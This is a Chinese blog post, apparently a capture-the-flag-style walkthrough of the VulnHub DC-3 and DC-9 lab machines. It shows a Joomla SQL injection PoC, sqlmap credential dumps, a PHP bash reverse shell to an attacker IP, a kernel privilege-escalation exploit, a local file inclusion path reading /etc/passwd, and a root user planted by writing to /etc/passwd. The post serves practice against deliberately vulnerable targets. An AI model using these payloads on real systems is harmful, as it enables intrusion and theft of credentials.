@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>vulnhub渗透靶机dc系列 - Lprvep</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="vulnhub渗透靶机dc系列" />
+<meta property="og:description" content="DC-3 信息收集 首先是使用nmap对靶机进行一个简单的扫描" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.lprvep.com/posts/vulnhub-dc-series/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-07-10T03:12:13&#43;08:00" />
+<meta property="article:modified_time" content="2020-07-10T03:12:13&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="vulnhub渗透靶机dc系列"/>
+<meta name="twitter:description" content="DC-3 信息收集 首先是使用nmap对靶机进行一个简单的扫描"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/main.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/dark.css" media="(prefers-color-scheme: dark)" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom-dark.css" media="(prefers-color-scheme: dark)" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="https://www.lprvep.com/js/main.js"></script>
+	<script src="https://www.lprvep.com/js/abc.js"></script>
+	<script src="https://www.lprvep.com/js/xyz.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://www.lprvep.com/">
+	<h1 class="site-title"><a href="https://www.lprvep.com/">Lprvep</a></h1>
+	<div class="site-description"><h2>Web Security</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/godbless7" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/lprvep" title="Twitter"><i data-feather="twitter"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/read">Read</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+			<li>
+				<a href="/avlist">Avlist</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">vulnhub渗透靶机dc系列</h1>
+			<div class="meta">Posted at &mdash; Jul 10, 2020</div>
+		</div>
+
+		<div class="markdown">
+			<h3 id="dc-3">DC-3</h3>
+<h4 id="信息收集">信息收集</h4>
+<p>首先是使用nmap对靶机进行一个简单的扫描</p>
+<p><img src="images/vulnhub-dc-series/1.png" alt="1"></p>
+<p>发现只是打开了一个80的web端口</p>
+<p>然后通过浏览器识别cms的插件发现该系统是使用joomla</p>
+<p><img src="images/vulnhub-dc-series/2.png" alt="2"></p>
+<p>知道是啥cms以后就好办了,可以使用joomsacn来对该网站进行深一步的探索</p>
+<p>工具地址:https://github.com/rezasp/joomscan</p>
+<p><img src="images/vulnhub-dc-series/3.png" alt="3"></p>
+<p>通过进一步的探索可以得到以下信息:</p>
+<ol>
+<li>版本是3.7.0</li>
+<li>后台地址为administrator</li>
+</ol>
+<p>恰巧joomla3.7.0存在个sql漏洞,cve-2017-8917,poc如下</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">site/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)
+</code></pre></div><h4 id="权限获取">权限获取</h4>
+<p>通过上面找来的poc,测试后发现确实存在注入</p>
+<p><img src="images/vulnhub-dc-series/4.png" alt="4"></p>
+<p>直接往sqlmap里面甩,一步到位</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sqlmap -u <span style="color:#2aa198">&#34;http://192.168.140.129/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk=3 --level=5 --random-agent -p list<span style="color:#cb4b16">[fullordering]</span> -D joomladb -T <span style="color:#2aa198">&#39;#__users&#39;</span> -C name,password --dump
+
++--------+--------------------------------------------------------------+
+| name   | password                                                     |
++--------+--------------------------------------------------------------+
+| admin  | <span style="color:#268bd2">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |
++--------+--------------------------------------------------------------+
+
+</code></pre></div><p>得到这密码后,直接往cmd5上甩</p>
+<p><img src="images/vulnhub-dc-series/5.png" alt="5"></p>
+<p>发现查询不到,到这里的突然思绪就断了</p>
+<p>但想了一下,vulnhub对kali带的一些工具依赖性极高</p>
+<p>就去百度了一波kali上破解密码的工具</p>
+<p>后来发现john这款工具能直接解出密码</p>
+<p><img src="images/vulnhub-dc-series/6.png" alt="6"></p>
+<p>冲到/administrator进入后台</p>
+<p><img src="images/vulnhub-dc-series/7.png" alt="7"></p>
+<p>进到后台后就清晰明了很多</p>
+<p>直接通过模板写入一句话</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Extensions -&gt; Templates -&gt; Templates
+</code></pre></div><p><img src="images/vulnhub-dc-series/8.png" alt="8"></p>
+<p>进到里面后,随便选个模板就可以写入,我选择的是Beez3这个模板</p>
+<p>直接在当前目录下新建个123.php然后保存</p>
+<p><img src="images/vulnhub-dc-series/9.png" alt="9"></p>
+<p>然后对应的地址就是</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://192.168.140.129/templates/beez3/123.php
+</code></pre></div><p>然后直接连接上去即可</p>
+<p><img src="images/vulnhub-dc-series/10.png" alt="10"></p>
+<h4 id="提升权限">提升权限</h4>
+<p>为了方便进行操作,就把shell反弹到kali上</p>
+<p>在写个php</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+system(<span style="color:#2aa198">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.140.128/7777 0&gt;&amp;1&#39; &#34;</span>);
+<span style="color:#719e07">?&gt;</span> 
+</code></pre></div><p><img src="images/vulnhub-dc-series/11.png" alt="11"></p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">www-data<span style="color:#268bd2">@DC</span>-3:/var/www/html/templates/beez3$ uname -a
+Linux DC-3 4.4.0-21-generic <span style="color:#586e75">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
+</code></pre></div><p>查询内核版本在使用searchsploit搜索相应的内核脚本</p>
+<p><img src="images/vulnhub-dc-series/12.png" alt="12"></p>
+<p>后来发现上面的三个内核脚本无果,基本都是一下的问题,编译不了</p>
+<p>啥原因就不管它了,换个方式继续冲!</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">www-data<span style="color:#268bd2">@DC</span>-3:/var/www/html/templates/beez3$ gcc decr.c -m32 -O2 -o decr
+gcc decr.c -m32 -O2 -o decr
+decr.c: <span style="color:#719e07">In</span> <span style="color:#719e07">function</span> <span style="color:#2aa198">&#39;privesc&#39;</span>:
+decr.c:242:42: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+         commit_creds(prepare_kernel_cred((uint64_t)NULL));
+                                          ^
+decr.c: At top level:
+decr.c:245:5: error: redefinition of <span style="color:#2aa198">&#39;main&#39;</span>
+ int main() {
+     ^
+decr.c:179:5: note: previous definition of <span style="color:#2aa198">&#39;main&#39;</span> was here
+ int main(void) {
+     ^
+
+</code></pre></div><p>内核提权不行,那就从操作系统入手</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">www-data<span style="color:#268bd2">@DC</span>-3:/var/www/html/templates/beez3$ <span style="color:#b58900">cat </span>/etc/issue
+<span style="color:#b58900">cat </span>/etc/issue
+Ubuntu 16.04 LTS \n \l
+</code></pre></div><p>发现是ubuntu16.04 继续使用searchsploit搜索</p>
+<p>经过筛选只有以下符合了</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Linux Kernel 4.4.x (Ubuntu 16.04) - <span style="color:#2aa198">&#39;double-fdput()&#39;</span> bpf(BPF_PROG_LOAD) Privilege Escalation
+linux/local/39772.txt
+
+<span style="color:#586e75">#下载地址</span>
+Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+</code></pre></div><p>这里因为靶机没有git,所以可以使用蚁剑或者python搭建个web,wget来下载</p>
+<p>我是直接使用蚁剑直接上传了</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#586e75">#解压</span>
+www-data<span style="color:#268bd2">@DC</span>-3:/tmp/$ tar -xvf exploit.tar
+www-data<span style="color:#268bd2">@DC</span>-3:/tmp/$ <span style="color:#b58900">cd </span>ebpf_mapfd_doubleput_exploit
+
+<span style="color:#586e75">#编译途中可能会有几个警告,警告如下,不需要理会,继续往下</span>
+www-data<span style="color:#268bd2">@DC</span>-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./compile.sh
+doubleput.c: <span style="color:#719e07">In</span> <span style="color:#719e07">function</span> <span style="color:#2aa198">&#39;make_setuid&#39;</span>:
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)<span style="color:#2aa198">&#34;&#34;</span>
+    
+    
+<span style="color:#586e75">#然后执行提权文件</span>
+www-data<span style="color:#268bd2">@DC</span>-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. <span style="color:#719e07">if</span> this worked, you&#39;ll have a root shell <span style="color:#719e07">in</span> &lt;=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+<span style="color:#b58900">cd </span>/root
+<span style="color:#b58900">ls
+</span><span style="color:#b58900"></span>the-flag.txt
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+
+</code></pre></div><h4 id="总结">总结</h4>
+<ol>
+<li>靶机使用joomla3.7.0,存在sql漏洞[cve-2017-8917],得到密码获得后台权限</li>
+<li>joomla后台可以在模板页面进行getshell</li>
+<li>系统使用的是ubuntu16.04,可以使用[ &lsquo;double-fdput()&rsquo; bpf(BPF_PROG_LOAD) Privilege Escalation] 提权</li>
+</ol>
+<h3 id="dc-9">DC-9</h3>
+<h4 id="信息收集-1">信息收集</h4>
+<p>目标地址为192.168.140.130</p>
+<p>然后进行一个端口扫描</p>
+<p><img src="images/vulnhub-dc-series/13.png" alt="13"></p>
+<p>80端口是开启状态,然后22端口是处于一个filtered状态</p>
+<p>以下是Nmap官网对这一含义的解释</p>
+<blockquote>
+<p><code>filtered</code>意味着防火墙,过滤器或者其它网络障碍阻止了该端口被访问,Nmap无法得知它是 <code>open</code>还是 <code>closed</code></p>
+</blockquote>
+<p>先暂时不管它,我们从80端口的http服务入手</p>
+<p>是一个比较常规的网站</p>
+<p>然后有四个php文件:index.php,display.php,search.php,manage.php</p>
+<p><img src="images/vulnhub-dc-series/14.png" alt="14"></p>
+<h4 id="权限获取-1">权限获取</h4>
+<p>一般这种情况下都会选择有交互页面的进行测试,看看有没有sql注入什么的</p>
+<p>这里有交互的页面就search.php的搜索功能,和manage.php的用户登录页面</p>
+<p>先从搜索页面入手,随便输入个值</p>
+<p><img src="images/vulnhub-dc-series/16.png" alt="16"></p>
+<p>经典单引号报错,初步判断有注入</p>
+<p><img src="images/vulnhub-dc-series/17.png" alt="17"></p>
+<p>直接甩入sqlmap,确实存在注入</p>
+<p><img src="images/vulnhub-dc-series/18.png" alt="18"></p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">λ python sqlmap.py -r sql.txt -D users -T UserDetails -C username,password --dump
++-----------+---------------+
+| username  | password      |
++-----------+---------------+
+| marym     | 3kfs86sfd     |
+| julied    | 468sfdfsd2    |
+| fredf     | 4sfd87sfd1    |
+| barneyr   | RocksOff      |
+| tomc      | TC&amp;TheBoyz    |
+| jerrym    | B8m<span style="color:#586e75">#48sd      |</span>
+| wilmaf    | Pebbles       |
+| bettyr    | BamBam01      |
+| chandlerb | UrAG0D!       |
+| joeyt     | Passw0rd      |
+| rachelg   | yN72<span style="color:#586e75">#dsd      |</span>
+| rossg     | ILoveRachel   |
+| monicag   | 3248dsds7s    |
+| phoebeb   | smellycats    |
+| scoots    | YR3BVxxxw87   |
+| janitor   | Ilovepeepee   |
+| janitor2  | Hawaii-Five-0 |
++-----------+---------------+
+
+<span style="color:#586e75">#跑出上面的数据后,去尝试登录,发现并不能登录上去,心想是不是搞错表了,就换了个看看</span>
+
+<span style="color:#586e75">#果然换了个表就把md5解密后就可以登录进去了</span>
+λ python sqlmap.py -r sql.txt -D Staff -T Users -C Username,Password --dump
+Database: Staff
+Table: Users
+[1 entry]
++----------+----------------------------------+
+| Username | Password                         |
++----------+----------------------------------+
+| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
++----------+----------------------------------+
+<span style="color:#586e75">#md5解密结果:transorbital1</span>
+</code></pre></div><p>登录成功后,只是多了个添加用户的功能,并不能为深入提供什么帮助</p>
+<p>然后到这突然思路就断了,这时候就应该点支烟冷静一下</p>
+<p>烟抽完以后就发现,下图框起来的英文 &ldquo;File does not exist&rdquo;</p>
+<p><img src="images/vulnhub-dc-series/19.png" alt="19"></p>
+<p>提示文件不存在,那么会不会存在本地文件包含呢</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">?file=../../../../etc/passwd
+</code></pre></div><p>复制粘贴直接冲</p>
+<p>果然是存在本地文件包含的</p>
+<p><img src="images/vulnhub-dc-series/20.png" alt="20"></p>
+<p>但是到这里思路又断了,因为感觉这个没啥用</p>
+<p>回到最初,ssh处于被filtered状态的状态,然后我们现在可以通过本地包含来查看防火墙的配置是怎么写的</p>
+<p>尝试读取&quot;/etc/sysconfig/iptables&quot;并没有发现该配置文件并不存在</p>
+<p>只能拿出字典来fuzz配置文件</p>
+<p>后来fuzz出了个/etc/knockd.conf的文件</p>
+<p><img src="images/vulnhub-dc-series/21.png" alt="21"></p>
+<p>以下是对该服务的一个解释</p>
+<blockquote>
+<p>knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。</p>
+</blockquote>
+<p>也就是说想要连接ssh需要敲门才可以</p>
+<p>依次敲门7469-&gt;8475-&gt;9842</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">nmap -p 7469 192.168.140.130
+nmap -p 8457 192.168.140.130
+nmap -p 9842 192.168.140.130
+</code></pre></div><p>然后22端口就神奇的打开了</p>
+<p><img src="images/vulnhub-dc-series/22.png" alt="22"></p>
+<h4 id="提升权限-1">提升权限</h4>
+<p>这时候就想着爆破,用刚刚开始注入出来的用户和密码来爆破</p>
+<p>爆出三个用户</p>
+<p><img src="images/vulnhub-dc-series/23.png" alt="23"></p>
+<p>在这三个用户中,都分别登陆查看了一波</p>
+<p>然后发现janitor这个用户存在个.secrets-for-putin</p>
+<p><img src="images/vulnhub-dc-series/26.png" alt="26"></p>
+<p>然后进入到这个目录后,存在个名为password的txt</p>
+<p><img src="images/vulnhub-dc-series/25.png" alt="25"></p>
+<p>这里也暗示得差不多了,把文本里的几串密码,丢进去在跑一次</p>
+<p>然后这次又多跑出来了个fredf的账户</p>
+<p><img src="images/vulnhub-dc-series/24.png" alt="24"></p>
+<p>登录操作,前面几个账户都是没有sudo的权限的,但是这个账户</p>
+<p>在/opt/devstuff/dist/test目录下的test是有不需要密码就有的sudo权限的</p>
+<p><img src="images/vulnhub-dc-series/27.png" alt="27"></p>
+<p>然后就去到这个目录下,运行看看,看看这个是干嘛用的</p>
+<p>然后提示了个使用的方法,出现了个test.py的名字</p>
+<p><img src="images/vulnhub-dc-series/28.png" alt="28"></p>
+<p>现在还不知道这个文件的使用方法,就需要先find搜索出来</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">find / -name test.py -type f 2&gt;/dev/null
+</code></pre></div><p><img src="images/vulnhub-dc-series/29.png" alt="29"></p>
+<p>以下是test.py的源码</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#719e07">import</span> sys
+
+<span style="color:#719e07">if</span> <span style="color:#b58900">len</span> (sys<span style="color:#719e07">.</span>argv) <span style="color:#719e07">!=</span> <span style="color:#2aa198">3</span> :
+    <span style="color:#719e07">print</span> (<span style="color:#2aa198">&#34;Usage: python test.py read append&#34;</span>)
+    sys<span style="color:#719e07">.</span>exit (<span style="color:#2aa198">1</span>)
+
+<span style="color:#719e07">else</span> :
+    f <span style="color:#719e07">=</span> <span style="color:#b58900">open</span>(sys<span style="color:#719e07">.</span>argv[<span style="color:#2aa198">1</span>], <span style="color:#2aa198">&#34;r&#34;</span>)
+    output <span style="color:#719e07">=</span> (f<span style="color:#719e07">.</span>read())
+
+    f <span style="color:#719e07">=</span> <span style="color:#b58900">open</span>(sys<span style="color:#719e07">.</span>argv[<span style="color:#2aa198">2</span>], <span style="color:#2aa198">&#34;a&#34;</span>)
+    f<span style="color:#719e07">.</span>write(output)
+    f<span style="color:#719e07">.</span>close()
+
+</code></pre></div><p>原理也很简单,将一个文件内容写入到另一个文件内容</p>
+<p>这时候我们就可以先写好个文件,然后往/etc/passwd写入,然后切换写入的用户就可以达到root权限</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#586e75">#paaswd的规则就是 用户名:加密后的密码:用户id:组id:账户描述:用户home目录:用户shell</span>
+<span style="color:#586e75">#以下的操作,就是先把密码加密,然后在把规则写入到临时文件中,最后在用到test文件写入到passwd中</span>
+
+fredf<span style="color:#268bd2">@dc</span><span style="color:#719e07">-</span><span style="color:#2aa198">9</span>:<span style="color:#719e07">/</span>opt<span style="color:#719e07">/</span>devstuff<span style="color:#719e07">/</span>dist<span style="color:#719e07">/</span>test$ perl <span style="color:#719e07">-</span>le <span style="color:#2aa198">&#39;print crypt(&#34;lprvep&#34;,&#34;salt&#34;)&#39;</span>
+saLbaFQ3dcdcg
+fredf<span style="color:#268bd2">@dc</span><span style="color:#719e07">-</span><span style="color:#2aa198">9</span>:<span style="color:#719e07">/</span>opt<span style="color:#719e07">/</span>devstuff<span style="color:#719e07">/</span>dist<span style="color:#719e07">/</span>test$ echo <span style="color:#2aa198">&#34;lprvep:saLbaFQ3dcdcg&#34;</span>
+lprvep:saLbaFQ3dcdcg
+fredf<span style="color:#268bd2">@dc</span><span style="color:#719e07">-</span><span style="color:#2aa198">9</span>:<span style="color:#719e07">/</span>opt<span style="color:#719e07">/</span>devstuff<span style="color:#719e07">/</span>dist<span style="color:#719e07">/</span>test$ echo <span style="color:#2aa198">&#34;lprvep:saLbaFQ3dcdcg:0:0:root:/root:/bin/bash&#34;</span> <span style="color:#719e07">&gt;</span> <span style="color:#719e07">/</span>tmp<span style="color:#719e07">/</span>passwd
+fredf<span style="color:#268bd2">@dc</span><span style="color:#719e07">-</span><span style="color:#2aa198">9</span>:<span style="color:#719e07">/</span>opt<span style="color:#719e07">/</span>devstuff<span style="color:#719e07">/</span>dist<span style="color:#719e07">/</span>test$ sudo <span style="color:#719e07">./</span>test <span style="color:#2aa198">&#34;/tmp/passwd&#34;</span> <span style="color:#2aa198">&#34;/etc/passwd&#34;</span>
+fredf<span style="color:#268bd2">@dc</span><span style="color:#719e07">-</span><span style="color:#2aa198">9</span>:<span style="color:#719e07">/</span>opt<span style="color:#719e07">/</span>devstuff<span style="color:#719e07">/</span>dist<span style="color:#719e07">/</span>test$ su <span style="color:#719e07">-</span> lprvep
+Password: 
+root<span style="color:#268bd2">@dc</span><span style="color:#719e07">-</span><span style="color:#2aa198">9</span>:<span style="color:#719e07">~</span><span style="color:#586e75"># id</span>
+uid<span style="color:#719e07">=</span><span style="color:#2aa198">0</span>(root) gid<span style="color:#719e07">=</span><span style="color:#2aa198">0</span>(root) groups<span style="color:#719e07">=</span><span style="color:#2aa198">0</span>(root)
+root<span style="color:#268bd2">@dc</span><span style="color:#719e07">-</span><span style="color:#2aa198">9</span>:<span style="color:#719e07">~</span><span style="color:#586e75"># </span>
+
+
+</code></pre></div><p>最终结果</p>
+<p><img src="images/vulnhub-dc-series/30.png" alt="30"></p>
+<h4 id="总结-1">总结</h4>
+<p>DC-9这个靶机还是比较有意思的</p>
+<p>先通过注入拿到管理员权限,然后找到文件包含,fuzz出端口敲门的配置文件</p>
+<p>敲开22端口,在运用在注入中获取到的账户和密码去爆破ssh</p>
+<p>再从爆破出来的账户中找到隐藏的.secrets-for-putin目录</p>
+<p>从里面提取密码再次爆破</p>
+<p>最后的有sudo权限的文件,到写入passwd,每一步都串联着很紧密</p>
+<p>体验感很舒服~~</p>
+
+		</div>
+
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/vulnhub">vulnhub</a></li>
+								
+								<li><a href="/tags/%E9%9D%B6%E6%9C%BA">靶机</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © Copyright notice |  <a href="https://github.com/godbless7">lprvep</a></div>
+	</nav>
+</div>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>feather.replace()</script>
+</body>
+</html>
